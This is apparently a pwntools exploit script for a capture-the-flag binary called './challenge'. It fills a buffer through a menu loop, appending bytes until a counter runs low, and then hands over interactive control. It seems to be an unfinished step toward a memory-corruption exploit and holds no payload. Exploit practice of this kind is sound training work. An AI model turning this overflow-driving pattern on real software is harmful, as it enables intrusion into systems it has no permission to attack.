from pwn import *
p = process("./challenge")
elf = ELF("./challenge")
length = 0x400

def init(data):
	p.sendlineafter("> ", "1")
	p.sendafter("data: ", data)

def append():
	global length
	p.sendlineafter("> ", "2")
	p.recvuntil("Give me")
	t = int(p.recv(3))
	if(t > length):
		t = length
	length -= t
	p.send("b" * t)
if __name__ == "__main__":
	init("a" * 127)
	while(length >= 8):
		append()

	print(length)
	p.interactive()
